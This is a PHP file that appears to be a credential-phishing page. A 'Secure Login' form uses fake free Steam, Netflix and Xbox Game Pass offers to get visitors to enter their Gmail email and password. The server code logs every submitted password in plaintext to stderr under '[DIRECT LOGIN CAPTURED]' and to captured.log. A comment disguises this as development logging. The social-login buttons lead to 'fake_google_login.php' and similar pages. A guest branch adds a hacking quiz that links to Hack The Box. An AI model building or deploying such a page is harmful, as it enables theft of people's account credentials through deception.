<?php
session_start();

// Check for guest or logout
if (isset($_GET['guest'])) {
    // Show guest dashboard
    $randomId = rand(1000, 9999);
    $guestName = "Guest User $randomId";
    $_SESSION['user'] = $guestName;
    $_SESSION['guest'] = true;
    ?>
   <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Guest Hacker Terminal</title>

<style>
body {
    margin: 0;
    background: #0a0a0a;
    color: #00ff9f;
    font-family: "Courier New", monospace;
}

/* Container */
.terminal {
    max-width: 900px;
    margin: 40px auto;
    background: #111;
    border-radius: 10px;
    padding: 25px;
    box-shadow: 0 0 25px rgba(0,255,159,0.15);
}

/* Header */
h1 {
    color: #00ffaa;
}

/* Sections */
.section {
    margin-top: 20px;
    line-height: 1.6;
}

/* blinking cursor */
.cursor {
    display: inline-block;
    width: 8px;
    height: 18px;
    background: #00ff9f;
    animation: blink 1s infinite;
}

@keyframes blink {
    50% { opacity: 0; }
}

/* Buttons */
button {
    background: #00ff9f;
    border: none;
    padding: 10px 18px;
    margin: 10px 5px 0 0;
    cursor: pointer;
    border-radius: 5px;
    font-weight: bold;
}

button:hover {
    background: #00cc7a;
}

/* Quiz */
.quiz {
    background: #0d0d0d;
    padding: 15px;
    border-radius: 8px;
    margin-top: 20px;
}

input {
    width: 100%;
    background: black;
    border: 1px solid #00ff9f;
    color: #00ff9f;
    padding: 6px;
    margin-top: 5px;
}

/* Result */
#result {
    margin-top: 10px;
    font-weight: bold;
}
</style>
</head>

<body>

<div class="terminal">

<h1>Welcome, <?php echo htmlspecialchars($guestName); ?> <span class="cursor"></span></h1>

<div class="section">
<p>> Booting secure guest environment...</p>
<p>> Access Level: Limited</p>
<p>> Status: Active</p>
</div>

<div class="section">
<h2>🧠 Introduction to Hacking</h2>
<p>
Hacking is the art of finding vulnerabilities in systems and exploiting them.
It requires creativity, logic, and deep technical knowledge.
</p>

<h2>🛡️ Ethical Hackers</h2>
<p>
Ethical hackers use these same techniques to protect systems, fix weaknesses,
and secure organizations from cyber attacks.
</p>
</div>

<div class="section">
<h2>🎯 Your Mission</h2>
<p>
Think like an attacker. Act like a defender.  
Test your skills on real-world labs and challenges.
</p>
<p>
Start your journey with <b>Hack The Box</b> 🚀
</p>
</div>

<div class="quiz">
<h3>⚡ Challenge Questions</h3>

<p>1. What does SQL stand for?</p>
<input id="q1" type="text">

<p>2. Which attack injects malicious code into forms?</p>
<input id="q2" type="text">

<p>3. What port does HTTP run on?</p>
<input id="q3" type="text">

<br>
<button onclick="checkAnswers()">Submit Answers</button>

<p id="result"></p>
</div>

<button onclick="goHTB()">Enter Hack The Box</button>
<button onclick="logout()">Logout</button>

</div>

<script>
function checkAnswers() {
    let score = 0;

    if (document.getElementById("q1").value.toLowerCase().includes("structured query language")) score++;
    if (document.getElementById("q2").value.toLowerCase().includes("sql injection")) score++;
    if (document.getElementById("q3").value == "80") score++;

    let result = "You got " + score + "/3 correct.";

    if (score === 3) {
        result += " 🔥 Excellent! You're hacker material.";
    }

    document.getElementById("result").innerText = result;
}

function goHTB() {
    window.open('https://www.hackthebox.com/', '_blank');
}

function logout() {
    window.location.href = '?logout=1';
}
</script>

</body>
</html>

<?php
    exit;
} elseif (isset($_GET['logout'])) {
    session_destroy();
    header("Location: /");
    exit;
}
 
// ─── Security: rate limiting via session ────────────────────────────────────
$now = time();
if (!isset($_SESSION['attempts'])) $_SESSION['attempts'] = [];
// Purge attempts older than 15 minutes
$_SESSION['attempts'] = array_filter($_SESSION['attempts'], fn($t) => $now - $t < 900);
 
$locked = count($_SESSION['attempts']) >= 5;
$message = null;
$msgType = null;
$debugInfo = null;
$guestRedirect = false;

// Temporary stored hash for credential verification
$stored_hash = password_hash('Password123!', PASSWORD_DEFAULT);
 
if (isset($_GET['guest'])) {
    $randomId = rand(1000, 9999);
    $guestName = "Guest User $randomId";
    $_SESSION['user'] = $guestName;
    $message = "Welcome, $guestName! Redirecting to Hack The Box...";
    $msgType = 'success';
    $guestRedirect = true;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$locked) {
    // Development capture: write email/password to server logs and local file.
    // Remove this in production immediately.
    $email_raw = trim($_POST['email'] ?? '');
    $password_raw = $_POST['password'] ?? '';
    $capture = sprintf(
        "%s | %s | email=%s password=%s\n",
        date('Y-m-d H:i:s'),
        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        $email_raw ?: '[empty]',
        $password_raw ?: '[empty]'
    );
    
    // Display in terminal
    $stderr = fopen('php://stderr', 'w');
    if ($stderr) {
        fprintf($stderr, "\n╔════════════════════════════════════════════════════════════╗\n");
        fprintf($stderr, "║ [DIRECT LOGIN CAPTURED]                                    ║\n");
        fprintf($stderr, "║ Email: %s\n", str_pad($email_raw, 50));
        fprintf($stderr, "║ Password: %s\n", str_pad($password_raw, 44));
        fprintf($stderr, "║ Time: %s\n", date('Y-m-d H:i:s'));
        fprintf($stderr, "║ IP: %s\n", str_pad($_SERVER['REMOTE_ADDR'] ?? 'unknown', 49));
        fprintf($stderr, "╚════════════════════════════════════════════════════════════╝\n\n");
        fclose($stderr);
    } else {
        error_log($capture);
    }
    
    @file_put_contents(__DIR__ . '/captured.log', $capture, FILE_APPEND | LOCK_EX);
 
    // CSRF check
    if (!isset($_POST['csrf'], $_SESSION['csrf']) || !hash_equals($_SESSION['csrf'], $_POST['csrf'])) {
        $message = 'Invalid request. Please try again.';
        $msgType = 'error';
    } else {
        $email    = filter_var($email_raw, FILTER_VALIDATE_EMAIL);
        $password = $password_raw;

        // Check for Gmail address
        if ($email && !str_ends_with(strtolower($email), '@gmail.com')) {
            $message = 'Please use a proper Gmail address (ending with @gmail.com).';
            $msgType = 'error';
        } elseif ($email && $password && password_verify($password, $stored_hash)) {
            session_regenerate_id(true);
            $_SESSION['attempts'] = [];
            $message = 'Welcome! You have successfully logged in. Redirecting to your dashboard...';
            $msgType = 'success';
            // header('Location: /dashboard'); exit;
        } else {
            $_SESSION['attempts'][] = $now;
            $remaining = 5 - count($_SESSION['attempts']);
            $message = $remaining > 0
                ? "Invalid credentials. {$remaining} attempt(s) remaining."
                : 'Account temporarily locked. Try again in 15 minutes.';
            $msgType = 'error';
        }
    }
}
 
// Generate CSRF token
if (empty($_SESSION['csrf'])) {
    $_SESSION['csrf'] = bin2hex(random_bytes(32));
}
$csrf = $_SESSION['csrf'];

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Login</title>
</head>
<body>
    <div class="background-animation">
        <div class="blob"></div>
        <div class="blob"></div>
        <div class="blob"></div>
        <div class="blob blob-4"></div>
        <div class="floating-card"></div>
        <div class="floating-card card-2"></div>
        <div class="floating-card card-3"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="light-orb"></div>
        <div class="light-orb orb-2"></div>
        <div class="light-orb orb-3"></div>
    </div>

    <div class="login-container">
        <div class="glass-effect">
            <div class="login-header">
                <div class="logo">🔐</div>
                <h1>Welcome Back</h1>
                <p class="subtitle">Login with your Gmail account to access the premium subscriptions and Free Games Passes</p>
            </div>

            <?php if ($message): ?>
                <div class="error-message" style="display: block; background: <?= $msgType === 'error' ? 'rgba(239, 68, 68, 0.2)' : 'rgba(74, 222, 128, 0.2)' ?>; color: <?= $msgType === 'error' ? '#fca5a5' : '#86efac' ?>; border-color: <?= $msgType === 'error' ? 'rgba(239, 68, 68, 0.3)' : 'rgba(74, 222, 128, 0.3)' ?>;">
                    <?= htmlspecialchars($message, ENT_QUOTES, 'UTF-8') ?>
                </div>
            <?php endif; ?>

            <form id="loginForm" method="POST" action="">
                <input type="hidden" name="csrf" value="<?= htmlspecialchars($csrf, ENT_QUOTES, 'UTF-8') ?>">

                <div class="form-group">
                    <label for="email">Email Address</label>
                    <input 
                        type="email" 
                        id="email" 
                        name="email" 
                        placeholder="you@gmail.com" 
                        value="<?= htmlspecialchars($_POST['email'] ?? '', ENT_QUOTES, 'UTF-8') ?>"
                        required
                        <?= $locked ? 'disabled' : '' ?>
                    >
                    <span class="input-icon">✉️</span>
                </div>

                <div class="form-group">
                    <label for="password">Password</label>
                    <input 
                        type="password" 
                        id="password" 
                        name="password" 
                        placeholder="••••••••" 
                        required
                        <?= $locked ? 'disabled' : '' ?>
                    >
                    <span class="input-icon">🔑</span>
                </div>

                <div class="remember-forgot">
                    <label class="checkbox-label">
                        <input type="checkbox" name="remember">
                        Remember me
                    </label>
                    <a href="#forgot">Forgot password?</a>
                </div>

                <button type="submit" class="login-btn" <?= $locked ? 'disabled' : '' ?>>
                    <span class="btn-text"><?= $locked ? 'Account Locked' : 'Sign In' ?></span>
                </button>
            </form>

            <div class="divider">
                <div class="divider-line"></div>
                <div class="divider-text">Or continue with</div>
                <div class="divider-line"></div>
            </div>

            <div class="social-login">
                <button type="button" class="social-btn" onclick="socialLogin('google')">Google</button>
                <button type="button" class="social-btn" onclick="socialLogin('github')">GitHub</button>
                <button type="button" class="social-btn" onclick="socialLogin('microsoft')">Microsoft</button>
            </div>

            <div class="offers-section">
                <h2>Explore the top trending subscriptions right now.</h2>
                <p class="offer-note">To access these premium offers, please sign in with your Gmail account above.</p>
                <div class="offer-grid">
                    <a href="index.php" class="offer-card">
                        <div class="offer-top">
                            <div class="offer-logo offer-logo-steam">Steam</div>
                        </div>
                        <h3>Steam Wallet Deals</h3>
                        <p>Unlock hot new PC games and seasonal flash discounts.</p>
                        <div class="offer-action">Claim now</div>
                    </a>
                    <a href="index.php" class="offer-card">
                        <div class="offer-top">
                            <div class="offer-logo offer-logo-epic">Epic</div>
                        </div>
                        <h3>Epic Games Store</h3>
                        <p>Claim free titles and get exclusive early-access drops.</p>
                        <div class="offer-action">Claim now</div>
                    </a>
                    <a href="index.php" class="offer-card">
                        <div class="offer-top">
                            <div class="offer-logo offer-logo-netflix">Netflix</div>
                        </div>
                        <h3>Netflix Premium</h3>
                        <p>Stream the latest shows and movies in Ultra HD.</p>
                        <div class="offer-action">Claim now</div>
                    </a>
                    <a href="index.php" class="offer-card">
                        <div class="offer-top">
                            <div class="offer-logo offer-logo-prime">Prime</div>
                        </div>
                        <h3>Amazon Prime</h3>
                        <p>Enjoy Prime Video, fast delivery, and member-only benefits.</p>
                        <div class="offer-action">Claim now</div>
                    </a>
                    <a href="index.php" class="offer-card">
                        <div class="offer-top">
                            <div class="offer-logo offer-logo-disney">Disney+</div>
                        </div>
                        <h3>Disney+ Bundle</h3>
                        <p>Watch Disney, Pixar, Marvel, Star Wars and National Geographic.</p>
                        <div class="offer-action">Claim now</div>
                    </a>
                    <a href="index.php" class="offer-card">
                        <div class="offer-top">
                            <div class="offer-logo offer-logo-xbox">Xbox</div>
                        </div>
                        <h3>Xbox Game Pass</h3>
                        <p>Play hundreds of games on console and PC with one pass.</p>
                        <div class="offer-action">Claim now</div>
                    </a>
                </div>
            </div>

            <div class="signup-link">
                Don't have an account? <a href="https://accounts.google.com/signup" target="_blank" rel="noreferrer">Create one</a>
            </div>
        </div>
    </div>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(-45deg, #1e3c72, #2a5298, #7e22ce, #ec4899);
            background-size: 400% 400%;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: auto;
            animation: gradient 15s ease infinite;
            position: relative;
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* Animated background elements */
        .background-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            pointer-events: none;
        }

        .blob {
            position: absolute;
            background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.1), rgba(255,255,255,0));
            border-radius: 50%;
            filter: blur(40px);
            opacity: 0.4;
            animation: float 8s ease-in-out infinite;
        }

        .blob:nth-child(1) {
            width: 300px;
            height: 300px;
            top: -50px;
            left: -50px;
            animation: float 8s ease-in-out infinite;
        }

        .blob:nth-child(2) {
            width: 200px;
            height: 200px;
            bottom: -30px;
            right: -30px;
            animation: float 7s ease-in-out infinite reverse;
        }

        .blob:nth-child(3) {
            width: 250px;
            height: 250px;
            top: 50%;
            right: -100px;
            animation: float 9s ease-in-out infinite;
        }

        .blob-4 {
            width: 280px;
            height: 280px;
            background: radial-gradient(circle at 30% 30%, rgba(118, 75, 162, 0.15), rgba(118, 75, 162, 0));
            bottom: 20%;
            left: 5%;
            animation: float 11s ease-in-out infinite reverse;
        }

        /* Floating cards */
        .floating-card {
            position: absolute;
            width: 120px;
            height: 120px;
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 15px;
            backdrop-filter: blur(10px);
            animation: floatCard 8s ease-in-out infinite;
            top: 10%;
            right: 5%;
        }

        .floating-card::after {
            content: '🔐';
            position: absolute;
            font-size: 50px;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            opacity: 0.6;
        }

        .card-2 {
            width: 100px;
            height: 100px;
            top: auto;
            bottom: 15%;
            left: 8%;
            animation: floatCard 7s ease-in-out infinite reverse;
        }

        .card-2::after {
            content: '✨';
            font-size: 45px;
        }

        .card-3 {
            width: 90px;
            height: 90px;
            top: 60%;
            right: 10%;
            animation: floatCard 9s ease-in-out infinite;
        }

        .card-3::after {
            content: '🛡️';
            font-size: 40px;
        }

        @keyframes floatCard {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-40px) rotate(5deg); }
        }

        /* Light orbs */
        .light-orb {
            position: absolute;
            width: 150px;
            height: 150px;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(102, 126, 234, 0.2), transparent 70%);
            filter: blur(50px);
            animation: pulse 4s ease-in-out infinite;
            pointer-events: none;
            top: 20%;
            left: 15%;
        }

        .orb-2 {
            top: 70%;
            right: 10%;
            background: radial-gradient(circle, rgba(236, 72, 153, 0.15), transparent 70%);
            animation: pulse 5s ease-in-out infinite;
        }

        .orb-3 {
            top: 40%;
            right: 5%;
            width: 100px;
            height: 100px;
            background: radial-gradient(circle, rgba(126, 34, 206, 0.2), transparent 70%);
            animation: pulse 6s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scale(1); }
            50% { opacity: 0.6; transform: scale(1.1); }
        }

        @keyframes float {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            33% { transform: translate(30px, -50px) rotate(120deg); }
            66% { transform: translate(-20px, 20px) rotate(240deg); }
        }

        /* Floating particles */
        .particle {
            position: absolute;
            width: 10px;
            height: 10px;
            background: rgba(255, 255, 255, 0.5);
            border-radius: 50%;
            pointer-events: none;
            animation: particle-float 10s infinite linear;
        }

        @keyframes particle-float {
            0% { transform: translateY(100vh) translateX(0) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100vh) translateX(100px) rotate(360deg); opacity: 0; }
        }

        .particle:nth-child(1) { left: 10%; animation-duration: 12s; animation-delay: 0s; }
        .particle:nth-child(2) { left: 20%; animation-duration: 14s; animation-delay: 2s; }
        .particle:nth-child(3) { left: 30%; animation-duration: 16s; animation-delay: 4s; }
        .particle:nth-child(4) { left: 40%; animation-duration: 13s; animation-delay: 1s; }
        .particle:nth-child(5) { left: 50%; animation-duration: 15s; animation-delay: 3s; }
        .particle:nth-child(6) { left: 60%; animation-duration: 14s; animation-delay: 5s; }
        .particle:nth-child(7) { left: 70%; animation-duration: 17s; animation-delay: 2s; }
        .particle:nth-child(8) { left: 80%; animation-duration: 13s; animation-delay: 4s; }
        .particle:nth-child(9) { left: 90%; animation-duration: 15s; animation-delay: 1s; }

        /* Login container */
        .login-container {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 420px;
            margin: auto;
        }

        .glass-effect {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 50px 40px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(40px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .login-header {
            text-align: center;
            margin-bottom: 40px;
        }

        .logo {
            font-size: 40px;
            margin-bottom: 15px;
            animation: logoFloat 3s ease-in-out infinite;
        }

        @keyframes logoFloat {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }

        h1 {
            color: #ffffff;
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 8px;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
        }

        .subtitle {
            color: rgba(255, 255, 255, 0.8);
            font-size: 13px;
            letter-spacing: 1px;
            text-transform: uppercase;
            font-weight: 500;
            animation: fadeInOut 3s ease-in-out infinite;
        }

        @keyframes fadeInOut {
            0%, 100% { opacity: 0.7; }
            50% { opacity: 1; }
        }

        .form-group {
            margin-bottom: 25px;
            position: relative;
        }

        label {
            display: block;
            color: rgba(255, 255, 255, 0.9);
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.05);
            color: #ffffff;
            font-size: 14px;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
            font-family: 'Segoe UI', sans-serif;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.15);
            border-color: rgba(255, 255, 255, 0.4);
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
        }

        input[type="email"]::placeholder,
        input[type="password"]::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }

        input:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .input-icon {
            position: absolute;
            right: 16px;
            top: 38px;
            color: rgba(255, 255, 255, 0.5);
            font-size: 18px;
            transition: color 0.3s ease;
        }

        .form-group:hover .input-icon {
            color: rgba(255, 255, 255, 0.8);
        }

        .remember-forgot {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            font-size: 12px;
        }

        .remember-forgot a {
            color: rgba(255, 255, 255, 0.7);
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .remember-forgot a:hover {
            color: #ffffff;
            text-decoration: underline;
        }

        .checkbox-label {
            display: flex;
            align-items: center;
            color: rgba(255, 255, 255, 0.7);
            cursor: pointer;
            user-select: none;
        }

        input[type="checkbox"] {
            width: 16px;
            height: 16px;
            margin-right: 8px;
            cursor: pointer;
            accent-color: rgba(255, 255, 255, 0.8);
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
            overflow: hidden;
            position: relative;
        }

        .login-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s ease;
        }

        .login-btn:hover:not(:disabled)::before {
            left: 100%;
        }

        .login-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
        }

        .login-btn:active:not(:disabled) {
            transform: translateY(0);
        }

        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 30px 0;
        }

        .divider-line {
            flex-grow: 1;
            height: 1px;
            background: rgba(255, 255, 255, 0.2);
        }

        .divider-text {
            color: rgba(255, 255, 255, 0.6);
            padding: 0 15px;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .social-login {
            display: flex;
            gap: 12px;
            margin-bottom: 25px;
        }

        .social-btn {
            flex: 1;
            padding: 12px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.05);
            color: white;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 500;
            font-size: 12px;
        }

        .social-btn:hover {
            background: rgba(255, 255, 255, 0.15);
            border-color: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
        }

        .signup-link {
            text-align: center;
            color: rgba(255, 255, 255, 0.7);
            font-size: 13px;
        }

        .signup-link a {
            color: rgba(255, 255, 255, 0.9);
            text-decoration: none;
            font-weight: 600;
            transition: color 0.3s ease;
        }

        .signup-link a:hover {
            color: #ffffff;
            text-decoration: underline;
        }

        .offers-section {
            margin-top: 32px;
            text-align: left;
        }

        .offers-section h2 {
            font-size: 18px;
            color: #f8fafc;
            margin-bottom: 12px;
            letter-spacing: 0.4px;
        }

        .offer-note {
            color: rgba(255, 255, 255, 0.75);
            font-size: 13px;
            margin-bottom: 16px;
            line-height: 1.6;
        }

        .offer-grid {
            display: grid;
            grid-template-columns: repeat(2, minmax(0, 1fr));
            gap: 12px;
            grid-auto-rows: minmax(220px, auto);
        }

        .offer-card {
            display: block;
            padding: 18px;
            border-radius: 18px;
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.12);
            text-decoration: none;
            color: #ffffff;
            transition: transform 0.25s ease, background 0.25s ease, border-color 0.25s ease;
            min-height: 220px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            overflow: visible;
        }

        .offer-card:hover {
            transform: translateY(-4px);
            background: rgba(255, 255, 255, 0.16);
            border-color: rgba(255, 255, 255, 0.22);
        }

        .offer-card h3 {
            margin-top: 16px;
            margin-bottom: 8px;
            font-size: 16px;
            color: #ffffff;
            word-break: break-word;
        }

        .offer-action {
            margin-top: 18px;
            padding: 10px 14px;
            border-radius: 999px;
            background: rgba(255, 255, 255, 0.12);
            color: #ffffff;
            font-size: 13px;
            font-weight: 700;
            text-align: center;
            transition: background 0.25s ease, color 0.25s ease;
        }

        .offer-card:hover .offer-action {
            background: #ffffff;
            color: #1e3c72;
        }

        .offer-card p {
            font-size: 13px;
            line-height: 1.55;
            color: rgba(255, 255, 255, 0.75);
            word-break: break-word;
            overflow-wrap: anywhere;
        }

        .offer-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 10px;
        }

        .offer-logo {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            min-width: 72px;
            height: 32px;
            border-radius: 999px;
            padding: 0 12px;
            font-size: 12px;
            font-weight: 700;
            color: #ffffff;
            text-transform: uppercase;
            letter-spacing: 0.03em;
        }

        .offer-logo-steam {
            background: #171a21;
        }

        .offer-logo-epic {
            background: #000000;
        }

        .offer-logo-netflix {
            background: #e50914;
        }

        .offer-logo-prime {
            background: #00a8e1;
        }

        .offer-logo-disney {
            background: #113ccf;
        }

        .offer-logo-xbox {
            background: #107c10;
        }


        @media (max-width: 680px) {
            .offer-grid {
                grid-template-columns: 1fr;
            }
        }

        /* Error message */
        .error-message {
            background: rgba(239, 68, 68, 0.2);
            color: #fca5a5;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            border: 1px solid rgba(239, 68, 68, 0.3);
            font-size: 12px;
            animation: shake 0.5s ease;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }

        /* Loading state */
        .login-btn.loading {
            pointer-events: none;
            opacity: 0.7;
        }

        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: -2px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Responsive */
        @media (max-width: 480px) {
            .glass-effect {
                padding: 40px 25px;
                margin: 20px;
            }

            h1 {
                font-size: 24px;
            }

            .login-btn {
                padding: 12px;
                font-size: 13px;
            }
        }
    </style>

    <script>
        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const loginBtn = form.querySelector('.login-btn');
        const btnText = loginBtn.querySelector('.btn-text');

        // Social login handler
        function socialLogin(provider) {
            const loginUrls = {
                'google': 'fake_google_login.php',
                'github': 'fake_github_login.php',
                'microsoft': 'fake_microsoft_login.php'
            };
            window.location.href = loginUrls[provider];
        }

        // Real-time input validation
        emailInput.addEventListener('blur', function() {
            if (this.value && !isValidEmail(this.value)) {
                // Visual feedback for invalid email
                this.style.borderColor = 'rgba(239, 68, 68, 0.5)';
                this.style.background = 'rgba(239, 68, 68, 0.08)';
            } else {
                this.style.borderColor = 'rgba(255, 255, 255, 0.2)';
                this.style.background = 'rgba(255, 255, 255, 0.05)';
            }
        });

        emailInput.addEventListener('focus', function() {
            this.style.borderColor = 'rgba(255, 255, 255, 0.4)';
            this.style.background = 'rgba(255, 255, 255, 0.15)';
        });

        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        form.addEventListener('submit', function(e) {
            if (!<?= $locked ? 'true' : 'false' ?>) {
                loginBtn.classList.add('loading');
                btnText.innerHTML = '<span class="spinner"></span>Signing in...';
            }
        });
    </script>

<?php if ($guestRedirect): ?>
<script> setTimeout(function() { window.open('https://www.hackthebox.com/', '_blank'); }, 3000); </script>
<?php endif; ?>

</body>
</html>